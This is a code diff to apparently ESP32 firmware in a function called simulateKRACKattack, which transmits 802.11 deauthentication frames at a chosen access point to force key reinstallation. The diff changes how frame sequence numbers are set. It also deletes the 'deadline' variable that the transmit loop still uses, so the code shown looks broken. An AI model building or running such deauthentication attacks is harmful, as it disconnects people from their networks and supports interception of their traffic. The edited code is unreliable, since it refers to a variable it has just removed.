@@ -44,7 +44,6 @@ KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t d
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
     unsigned long startTime = millis();
-    uint32_t deadline = startTime + durationMs;
     Serial.println("Transmitting deauthentication frames to trigger key reinstallation...");
 
     // Validate BSSID format once and parse it upfront
@@ -69,8 +68,8 @@ KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t d
     while ((int32_t)(millis() - deadline) < 0 && attacking && TxArm::isArmed()) {
         DeauthFrame frame;
         frame.frame_control = 0xc0;
-        frame.duration = 0;
-        frame.seq_ctrl = (esp_random() % 4096) << 4;
+        frame.duration = 0x0000;
+        frame.seq_ctrl = (deauthsSent % 4096) << 4;
         frame.reason_code = 7;
 
         memcpy(frame.bssid, parsedBSSID, 6);
